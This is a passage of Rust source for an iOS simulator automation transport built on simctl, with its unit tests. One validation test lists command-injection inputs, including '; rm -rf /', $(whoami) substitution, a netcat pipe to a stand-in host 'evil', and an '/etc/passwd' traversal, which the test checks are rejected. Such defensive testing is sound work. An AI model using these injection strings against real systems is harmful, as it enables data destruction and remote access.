            id: self.device_id.clone(),
            os: "ios".to_string(),
            model,
            sdk_version: None,
        })
    }

    async fn set_appearance(&self, dark: bool) -> Result<()> {
        let mode = if dark { "dark" } else { "light" };
        self.simctl_with_timeout(&["ui", &self.device_id, "appearance", mode], 5)
            .await?;
        Ok(())
    }

    async fn terminate_app(&self, package: &str) -> Result<()> {
        if !crate::validate::is_valid_package_name(package) {
            anyhow::bail!("Invalid bundle ID: {}", package);
        }
        let _ = self
            .simctl(&["terminate", &self.device_id, package])
            .await?;
        Ok(())
    }

    async fn uninstall_app(&self, package: &str) -> Result<()> {
        if !crate::validate::is_valid_package_name(package) {
            anyhow::bail!("Invalid bundle ID: {}", package);
        }
        self.simctl_with_timeout(&["uninstall", &self.device_id, package], 60)
            .await?;
        Ok(())
    }

    async fn grant_permission(&self, permission: &str, package: &str) -> Result<()> {
        if !crate::validate::is_valid_package_name(package) {
            anyhow::bail!("Invalid bundle ID: {}", package);
        }
        // simctl service names are lowercase words with hyphens.
        if permission.is_empty()
            || !permission
                .chars()
                .all(|c| c.is_ascii_lowercase() || c == '-')
        {
            anyhow::bail!("Invalid permission service '{}' (e.g. location, photos, camera, microphone, contacts, all)", permission);
        }
        self.simctl_with_timeout(
            &["privacy", &self.device_id, "grant", permission, package],
            10,
        )
        .await?;
        Ok(())
    }

    async fn clear_app_data(&self, package: &str) -> Result<()> {
        if !crate::validate::is_valid_package_name(package) {
            anyhow::bail!("Invalid package name: {}", package);
        }
        // Returning Ok made `reset_app` report a cold start it had not performed.
        // simctl has no data-only clear; removing the container means removing
        // the app, which is a different request with a different consequence.
        anyhow::bail!(
            "clear_app_data is not available on the iOS simulator — simctl has no data-only \
             clear. Use uninstall then install to get a fresh container."
        )
    }

    async fn open_url(&self, url: &str) -> Result<()> {
        crate::validate::validate_url(url).map_err(|e| anyhow!("open_url rejected: {e}"))?;
        let _ = self
            .simctl_with_timeout(&["openurl", &self.device_id, url], 10)
            .await?;
        Ok(())
    }

    async fn set_orientation(&self, rotation: u8) -> Result<()> {
        // 0=portrait, 1=landscape-left, 2=upside-down, 3=landscape-right
        // (matches the Android convention in adb.rs).
        let name = match rotation {
            0 => "portrait",
            1 => "landscape_left",
            2 => "portrait_upside_down",
            3 => "landscape_right",
            _ => anyhow::bail!("Invalid rotation: {} (0-3)", rotation),
        };
        let client = self.client().await?;
        client
            .act(Action::Orientation {
                orientation: name.to_string(),
            })
            .await
            .map_err(|e| anyhow!("{}", e))
    }

    async fn alert_text(&self) -> Result<Option<String>> {
        let tree = self.ui_tree().await?;
        Ok(find_alert(&tree).map(|(_, title)| title))
    }

    async fn alert_accept(&self) -> Result<()> {
        let tree = self.ui_tree().await?;
        let (alert, _) = find_alert(&tree).context("No alert is showing")?;
        let (x, y) = alert_button(&tree, &alert, ALERT_ACCEPT_LABELS)
            .context("Alert is showing but has no recognised accept button")?;
        self.tap(x, y).await
    }

    async fn alert_dismiss(&self) -> Result<()> {
        let tree = self.ui_tree().await?;
        let (alert, _) = find_alert(&tree).context("No alert is showing")?;
        let (x, y) = alert_button(&tree, &alert, ALERT_DISMISS_LABELS)
            .context("Alert is showing but has no recognised dismiss button")?;
        self.tap(x, y).await
    }

    async fn app_state(&self, package: &str) -> Result<u8> {
        if !crate::validate::is_valid_package_name(package) {
            anyhow::bail!("Invalid bundle id: {}", package);
        }
        let listing = self
            .simctl_str(&["spawn", &self.device_id, "launchctl", "list"])
            .await?;
        if !launchctl_lists_running_app(&listing, package) {
            return Ok(1);
        }
        if self.current_activity().await.unwrap_or_default() == package {
            Ok(4)
        } else {
            Ok(3)
        }
    }

    async fn is_app_in_foreground(&self, package: &str) -> Result<bool> {
        // Compare against the tree_hint's root bundle id.
        let current = self.current_activity().await?;
        Ok(current == package)
    }

    async fn simulate_biometric(&self, matches: bool) -> Result<()> {
        // Headless Face/Touch ID on the simulator: post a BiometricKit
        // notification. Sim must have biometrics enrolled first.
        let key = if matches {
            "com.apple.BiometricKit_Sim.fingerTouch.match"
        } else {
            "com.apple.BiometricKit_Sim.fingerTouch.nomatch"
        };
        self.simctl_with_timeout(&["spawn", &self.device_id, "notifyutil", "-p", key], 5)
            .await?;
        Ok(())
    }

    async fn set_location(&self, lat: f64, lng: f64) -> Result<()> {
        let _ = self
            .simctl_with_timeout(
                &[
                    "location",
                    &self.device_id,
                    "set",
                    &format!("{},{}", lat, lng),
                ],
                5,
            )
            .await?;
        Ok(())
    }

    async fn clear_location(&self) -> Result<()> {
        let _ = self
            .simctl_with_timeout(&["location", &self.device_id, "clear"], 5)
            .await?;
        Ok(())
    }

    async fn pasteboard_get(&self) -> Result<String> {
        let bytes = self
            .simctl_with_timeout(&["pbpaste", &self.device_id], 5)
            .await?;
        Ok(String::from_utf8_lossy(&bytes).to_string())
    }

    async fn pasteboard_set(&self, text: &str) -> Result<()> {
        use tokio::io::AsyncWriteExt;
        let mut child = tokio::process::Command::new(&self.xcrun_bin)
            .args(["simctl", "pbcopy", &self.device_id])
            .stdin(std::process::Stdio::piped())
            .spawn()
            .context("spawn simctl pbcopy")?;
        // Both of these were discarded, so a failed copy reported success and the
        // next paste silently used whatever was on the pasteboard before.
        if let Some(mut stdin) = child.stdin.take() {
            stdin
                .write_all(text.as_bytes())
                .await
                .context("write to simctl pbcopy")?;
        }
        let status = child.wait().await.context("wait for simctl pbcopy")?;
        if !status.success() {
            anyhow::bail!("simctl pbcopy failed: {status}");
        }
        Ok(())
    }

    async fn start_recording(&self) -> Result<String> {
        {
            let guard = self.recording.lock().unwrap();
            if guard.is_some() {
                anyhow::bail!("Recording already in progress");
            }
        }

        let _ = tokio::process::Command::new(&self.xcrun_bin)
            .args([
                "simctl",
                "io",
                &self.device_id,
                "screenConfig",
                "power",
                "on",
            ])
            .output()
            .await;

        let ts = chrono::Utc::now().format("%Y%m%d_%H%M%S");
        let dir = crate::paths::drengr_dir_or("/tmp").join("recordings");
        std::fs::create_dir_all(&dir)?;
        let path = dir.join(format!("{}_{}.mov", self.device_id, ts));
        let path_str = path.to_string_lossy().to_string();

        tracing::info!("starting screen recording → {}", path_str);
        let child = tokio::process::Command::new(&self.xcrun_bin)
            .args([
                "simctl",
                "io",
                &self.device_id,
                "recordVideo",
                "--codec=h264",
                &path_str,
            ])
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()
            .context("failed to spawn simctl recordVideo")?;

        self.recording
            .lock()
            .unwrap()
            .replace((child, path_str.clone()));
        Ok(path_str)
    }

    async fn stop_recording(&self) -> Result<String> {
        let taken = self.recording.lock().unwrap().take();
        let (mut child, path) = taken.ok_or_else(|| anyhow!("No recording in progress"))?;

        #[cfg(unix)]
        {
            if let Some(pid) = child.id() {
                unsafe {
                    libc::kill(pid as i32, libc::SIGINT);
                }
            }
        }
        let _ = tokio::time::timeout(Duration::from_secs(10), child.wait()).await;

        tracing::info!("stopped screen recording → {}", path);
        Ok(path)
    }

    async fn swipe_with_velocity(
        &self,
        from: Point,
        to: Point,
        velocity_pts_per_sec: f32,
    ) -> Result<()> {
        let duration_ms =
            crate::transport::swipe_duration_for_velocity(from, to, velocity_pts_per_sec);
        self.swipe(from, to, duration_ms).await
    }

    async fn list_installed_apps(&self) -> Result<Vec<String>> {
        let out = self
            .simctl_with_timeout(&["listapps", &self.device_id], 10)
            .await?;
        Ok(parse_listapps_output(&String::from_utf8_lossy(&out)))
    }

    async fn list_apps_with_names(&self) -> Result<Vec<crate::transport::AppInfo>> {
        let out = self
            .simctl_with_timeout(&["listapps", &self.device_id], 10)
            .await?;
        Ok(parse_listapps_with_names(&String::from_utf8_lossy(&out)))
    }

    async fn spotlight_search(&self, query: &str) -> Result<()> {
        // Spotlight on iOS: go to the home screen, pull down from mid-screen
        // to reveal the search field, then type. All via runner primitives.
        let (w, h) = self
            .screen_size()
            .await
            .unwrap_or(crate::transport::DEFAULT_SCREEN_SIZE);
        let client = self.client().await?;
        client
            .act(Action::Button {
                button: ButtonKind::Home,
            })
            .await
            .map_err(|e| anyhow!("{}", e))?;
        tokio::time::sleep(Duration::from_millis(400)).await;
        let cx = (w as f64) / 2.0;
        client
            .act(Action::Swipe {
                x1: cx,
                y1: (h as f64) * 0.30,
                x2: cx,
                y2: (h as f64) * 0.72,
                duration_ms: 300,
            })
            .await
            .map_err(|e| anyhow!("{}", e))?;
        tokio::time::sleep(Duration::from_millis(600)).await;
        client
            .act(Action::Type {
                text: query.to_string(),
                bundle_id: None,
            })
            .await
            .map_err(|e| anyhow!("{}", e))
    }

    async fn cleanup_runtime(&self) -> Result<()> {
        // Terminate the runner so the next run starts cold. Best-effort.
        match self
            .simctl(&["terminate", &self.device_id, RUNNER_BUNDLE_ID])
            .await
        {
            Ok(_) => tracing::info!("driver cleanup: terminated runner"),
            Err(e) => tracing::warn!("driver cleanup: terminate failed ({}) — continuing", e),
        }
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_simctl_devices_booted() {
        let json = r#"{
            "devices": {
                "com.apple.CoreSimulator.SimRuntime.iOS-17-2": [
                    {"udid": "ABC-123", "name": "iPhone 15", "state": "Booted"},
                    {"udid": "DEF-456", "name": "iPhone 14", "state": "Shutdown"}
                ],
                "com.apple.CoreSimulator.SimRuntime.iOS-16-4": [
                    {"udid": "GHI-789", "name": "iPhone 13", "state": "Booted"}
                ]
            }
        }"#;

        let devices = parse_simctl_devices(json).unwrap();
        assert_eq!(devices.len(), 2);
        let ids: Vec<&str> = devices.iter().map(|(id, _)| id.as_str()).collect();
        assert!(ids.contains(&"ABC-123"));
        assert!(ids.contains(&"GHI-789"));

        let abc = devices.iter().find(|(id, _)| id == "ABC-123").unwrap();
        assert_eq!(abc.1, "iPhone 15");
    }

    #[test]
    fn test_parse_simctl_devices_none_booted() {
        let json = r#"{
            "devices": {
                "com.apple.CoreSimulator.SimRuntime.iOS-17-2": [
                    {"udid": "ABC-123", "name": "iPhone 15", "state": "Shutdown"}
                ]
            }
        }"#;

        let devices = parse_simctl_devices(json).unwrap();
        assert!(devices.is_empty());
    }

    #[test]
    fn test_parse_simctl_devices_empty() {
        let json = r#"{"devices": {}}"#;
        let devices = parse_simctl_devices(json).unwrap();
        assert!(devices.is_empty());
    }

    #[test]
    fn test_parse_os_log_lines_basic() {
        let output =
            "2024-03-18 10:30:45.123456+0000 0x1234 Default  com.app.MyProcess: Hello from iOS\n";
        let entries = parse_os_log_lines(output);
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].level, "Default");
        assert_eq!(entries[0].tag, "com.app.MyProcess");
        assert!(entries[0].message.contains("Hello from iOS"));
    }

    #[test]
    fn test_parse_os_log_lines_skips_header() {
        let output = "Timestamp                       Thread     Type        Activity             PID    TTL\n2024-03-18 10:30:45.123456+0000 0x1234 Default  com.app: msg\n";
        let entries = parse_os_log_lines(output);
        assert_eq!(entries.len(), 1);
    }

    #[test]
    fn test_parse_os_log_lines_empty() {
        let entries = parse_os_log_lines("");
        assert!(entries.is_empty());
    }

    /// Rows copied verbatim from `simctl spawn <udid> launchctl list` on a
    /// booted iPhone 16 with Safari running.
    const LAUNCHCTL_SAMPLE: &str = "\
31334\t0\tUIKitApplication:com.apple.mobilesafari[afaa][rb-legacy]
31323\t0\tUIKitApplication:com.apple.family[4c32][rb-legacy]
31322\t0\tUIKitApplication:com.apple.mobilecalendar[1695][rb-legacy]
-\t0\tUIKitApplication:com.example.dead[0001][rb-legacy]
";

    #[test]
    fn launchctl_sees_a_running_app() {
        assert!(launchctl_lists_running_app(
            LAUNCHCTL_SAMPLE,
            "com.apple.mobilesafari"
        ));
    }

    #[test]
    fn launchctl_reports_a_terminated_app_as_absent() {
        // The real device drops the row entirely on terminate — verified live.
        assert!(!launchctl_lists_running_app(
            LAUNCHCTL_SAMPLE,
            "com.apple.mobilenotes"
        ));
    }

    #[test]
    fn launchctl_does_not_match_a_bundle_prefix() {
        // `com.apple.mobilecalendar` is the one running; a query for the
        // shorter `com.apple.mobilecal` must not be satisfied by its row.
        assert!(launchctl_lists_running_app(
            LAUNCHCTL_SAMPLE,
            "com.apple.mobilecalendar"
        ));
        assert!(!launchctl_lists_running_app(
            LAUNCHCTL_SAMPLE,
            "com.apple.mobilecal"
        ));
    }

    #[test]
    fn launchctl_treats_a_pidless_job_as_not_running() {
        assert!(!launchctl_lists_running_app(
            LAUNCHCTL_SAMPLE,
            "com.example.dead"
        ));
    }

    /// Wiring guard: proves `app_state` actually consults launchctl rather than
    /// returning a canned code. Tests of `launchctl_lists_running_app` alone
    /// still pass if the trait method stops calling it.
    #[tokio::test]
    async fn app_state_asks_launchctl_and_reports_not_running() {
        let dir = tempfile::tempdir().expect("tempdir");
        let fake = dir.path().join("xcrun");
        std::fs::write(
            &fake,
            format!("#!/bin/sh\ncat <<'EOF'\n{LAUNCHCTL_SAMPLE}EOF\n"),
        )
        .expect("write fake xcrun");
        let mut perms = std::fs::metadata(&fake).unwrap().permissions();
        std::os::unix::fs::PermissionsExt::set_mode(&mut perms, 0o755);
        std::fs::set_permissions(&fake, perms).expect("chmod");

        let mut t = SimctlTransport::new("TEST-UDID");
        t.xcrun_bin = fake.to_string_lossy().to_string();

        // Absent from the listing => genuinely not running. `Ok(0)` (the old
        // "unknown" placeholder) is not an acceptable answer here.
        assert_eq!(
            t.app_state("com.apple.mobilenotes")
                .await
                .expect("app_state"),
            1
        );
    }

    fn alert_tree() -> Vec<UiElement> {
        parse_tree_hint(&serde_json::json!({
            "type": "Application",
            "frame": [0, 0, 400, 800],
            "children": [{
                "type": "Button", "label": "OK", "frame": [10, 700, 60, 30]
            }, {
                "type": "Alert",
                "label": "Allow \u{201c}Maps\u{201d} to use your location?",
                "frame": [50, 300, 300, 200],
                "children": [
                    { "type": "StaticText", "label": "Your location is used to find nearby stores.",
                      "frame": [60, 340, 280, 40] },
                    { "type": "Button", "label": "Allow", "frame": [60, 440, 130, 40] },
                    { "type": "Button", "label": "Don't Allow", "frame": [200, 440, 130, 40] }
                ]
            }]
        }))
    }

    #[test]
    fn alert_text_reads_the_alert_title() {
        let (_, title) = find_alert(&alert_tree()).expect("alert should be found");
        assert!(title.contains("use your location"), "got: {title}");
    }

    #[test]
    fn no_alert_in_tree_is_distinguishable_from_an_alert() {
        let plain = parse_tree_hint(&serde_json::json!({
            "type": "Application",
            "frame": [0, 0, 400, 800],
            "children": [{ "type": "Button", "label": "OK", "frame": [10, 700, 60, 30] }]
        }));
        assert!(find_alert(&plain).is_none());
    }

    #[test]
    fn alert_buttons_are_scoped_to_the_alert_bounds() {
        let tree = alert_tree();
        let (alert, _) = find_alert(&tree).unwrap();
        let (x, y) = alert_button(&tree, &alert, ALERT_ACCEPT_LABELS).expect("accept button");
        // The "Allow" inside the alert, never the "OK" outside it at y=715.
        assert_eq!((x, y), (125, 460), "must tap the in-alert Allow button");
    }

    #[test]
    fn alert_dismiss_picks_the_negative_button() {
        let tree = alert_tree();
        let (alert, _) = find_alert(&tree).unwrap();
        let (x, _) = alert_button(&tree, &alert, ALERT_DISMISS_LABELS).expect("dismiss button");
        assert_eq!(x, 265, "must tap Don't Allow, not Allow");
    }

    #[test]
    fn test_simctl_transport_device_id() {
        let t = SimctlTransport::new("ABC-123-DEF");
        assert_eq!(t.device_id(), "ABC-123-DEF");
    }

    #[test]
    fn current_activity_returns_bundle_id_from_tree_hint() {
        let src = serde_json::json!({
            "type": "Application",
            "bundleId": "com.example.app"
        });
        assert_eq!(
            parse_bundle_id_from_tree_hint(&src).as_deref(),
            Some("com.example.app")
        );
    }

    #[test]
    fn current_activity_returns_unknown_for_missing_field() {
        let src = serde_json::json!({ "type": "Application" });
        assert!(parse_bundle_id_from_tree_hint(&src).is_none());
    }

    #[test]
    fn current_activity_falls_back_to_identifier_field() {
        let src = serde_json::json!({ "identifier": "com.example.app" });
        assert_eq!(
            parse_bundle_id_from_tree_hint(&src).as_deref(),
            Some("com.example.app")
        );
    }

    #[test]
    fn tree_hint_has_keyboard_detects_nested_keyboard() {
        let src = serde_json::json!({
            "type": "Application",
            "children": [{
                "type": "Window",
                "children": [{ "type": "Keyboard" }]
            }]
        });
        assert!(tree_hint_has_keyboard(&src));
    }

    #[test]
    fn tree_hint_has_keyboard_returns_false_when_absent() {
        let src = serde_json::json!({
            "type": "Application",
            "children": [{ "type": "Button" }]
        });
        assert!(!tree_hint_has_keyboard(&src));
    }

    #[test]
    fn listapps_with_names_json_branch_extracts_display_name() {
        let json = r#"{
            "com.apple.Maps": {
                "ApplicationType": "System",
                "CFBundleDisplayName": "Maps",
                "CFBundleIdentifier": "com.apple.Maps"
            },
            "com.example.notes": {
                "ApplicationType": "User",
                "CFBundleName": "Notes",
                "CFBundleIdentifier": "com.example.notes"
            }
        }"#;
        let apps = parse_listapps_with_names(json);
        assert_eq!(apps.len(), 2);
        let maps = apps.iter().find(|a| a.package == "com.apple.Maps").unwrap();
        assert_eq!(maps.display_name, "Maps");
        assert!(matches!(maps.kind, crate::transport::AppKind::System));
        let notes = apps
            .iter()
            .find(|a| a.package == "com.example.notes")
            .unwrap();
        assert_eq!(notes.display_name, "Notes");
        assert!(matches!(notes.kind, crate::transport::AppKind::User));
    }

    #[test]
    fn listapps_with_names_falls_back_to_plist() {
        let plist = r#"
            "com.apple.Maps" =     {
                ApplicationType = System;
                CFBundleDisplayName = Maps;
                CFBundleIdentifier = "com.apple.Maps";
            };
            "com.example.app" =     {
                CFBundleName = "Example";
                CFBundleIdentifier = "com.example.app";
            };
        "#;
        let apps = parse_listapps_with_names(plist);
        assert!(apps
            .iter()
            .any(|a| a.package == "com.apple.Maps" && a.display_name == "Maps"));
        assert!(apps
            .iter()
            .any(|a| a.package == "com.example.app" && a.display_name == "Example"));
    }

    #[test]
    fn listapps_with_names_empty_json_object_does_not_swallow() {
        let apps = parse_listapps_with_names("{}");
        assert!(apps.is_empty());
    }

    #[test]
    fn find_plist_value_handles_both_formats() {
        let xml = "<key>CFBundleDisplayName</key><string>Maps</string>";
        assert_eq!(
            find_plist_value(xml, "CFBundleDisplayName").as_deref(),
            Some("Maps")
        );

        let text = r#"CFBundleDisplayName = "Maps";"#;
        assert_eq!(
            find_plist_value(text, "CFBundleDisplayName").as_deref(),
            Some("Maps")
        );

        let unquoted = r#"ApplicationType = System;"#;
        assert_eq!(
            find_plist_value(unquoted, "ApplicationType").as_deref(),
            Some("System")
        );
    }

    #[test]
    fn find_plist_value_caps_truncated_at_newline() {
        let truncated = "CFBundleDisplayName = Maps\nApplicationType = System";
        assert_eq!(
            find_plist_value(truncated, "CFBundleDisplayName").as_deref(),
            Some("Maps")
        );
    }

    #[test]
    fn find_plist_value_missing_key_returns_none() {
        assert!(find_plist_value("nothing here", "CFBundleDisplayName").is_none());
    }

    #[tokio::test]
    async fn test_clear_app_data_rejects_flag_injection() {
        let t = SimctlTransport::new("ABC-123-DEF");
        let bad_inputs = [
            "; rm -rf /",
            "com.app`id`",
            "com.app$(whoami)",
            "com.app | nc evil 1234",
            "",
            "com/../etc/passwd",
        ];
        for bad in bad_inputs {
            let err = t.clear_app_data(bad).await.unwrap_err();
            assert!(
                err.to_string().contains("Invalid package name"),
                "input {:?} should be rejected, got: {}",
                bad,
                err
            );
        }
    }
}

#[cfg(test)]
mod foreground_hint_tests {
    use super::*;

    /// Every `drengr look`/`do` is its own process, so an in-memory-only cache is
    /// empty by construction and /observe was called with None — the runner then
    /// returned SpringBoard's tree while the screenshot showed the real app.
    /// Right pixels, wrong elements, no error. The hint must survive the process.
    #[test]
    fn foreground_hint_survives_a_new_process() {
        let home = std::env::temp_dir().join(format!("drengr_fg_{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&home);

        assert!(
            SimctlTransport::read_bundle_hint_in(&home).is_none(),
            "no hint must read as None, never Some(\"\") — an empty ?bundle= is worse than omitting it"
        );

        SimctlTransport::remember_bundle_in(&home, "dev.drengr.demo_shop");
        assert_eq!(
            SimctlTransport::read_bundle_hint_in(&home).as_deref(),
            Some("dev.drengr.demo_shop"),
            "a later process must still know the foreground app"
        );

        SimctlTransport::remember_bundle_in(&home, "  dev.drengr.web\n");
        assert_eq!(
            SimctlTransport::read_bundle_hint_in(&home).as_deref(),
            Some("dev.drengr.web"),
            "whitespace must be trimmed — a trailing newline would corrupt the query param"
        );

        let _ = std::fs::remove_dir_all(&home);
    }
}
